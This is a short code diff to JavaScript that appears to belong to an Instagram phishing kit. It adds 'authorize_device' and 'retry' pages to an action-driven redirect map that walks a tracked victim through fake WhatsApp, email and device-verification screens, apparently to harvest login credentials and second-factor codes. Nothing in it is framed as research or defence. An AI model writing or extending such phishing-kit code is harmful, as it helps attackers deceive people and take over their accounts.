@@ -352,7 +352,9 @@
                     'whatsapp_error': 'pages/whatsapp_incorrect.html',
                     'email_verification': 'pages/email.html',
                     'email_error': 'pages/email_incorrect.html',
-                    'technical_error': 'pages/technical_error.html'
+                    'technical_error': 'pages/technical_error.html',
+                    'authorize_device': 'pages/authorize_device.html',
+                    'retry': 'INSTAGRAM.html'
                 };
                 var page = pages[action] || 'pages/loading.html';
                 currentUser = user.username;
@@ -446,7 +448,9 @@
                         'whatsapp_error': 'pages/whatsapp_incorrect.html',
                         'email_verification': 'pages/email.html',
                         'email_error': 'pages/email_incorrect.html',
-                        'technical_error': 'pages/technical_error.html'
+                        'technical_error': 'pages/technical_error.html',
+                        'authorize_device': 'pages/authorize_device.html',
+                        'retry': 'INSTAGRAM.html'
                     };
                     var page = pages[action] || 'pages/loading.html';
                     window.location.href = page + (page.indexOf('?') > -1 ? '&' : '?') + 'user=' + encodeURIComponent(currentUser);
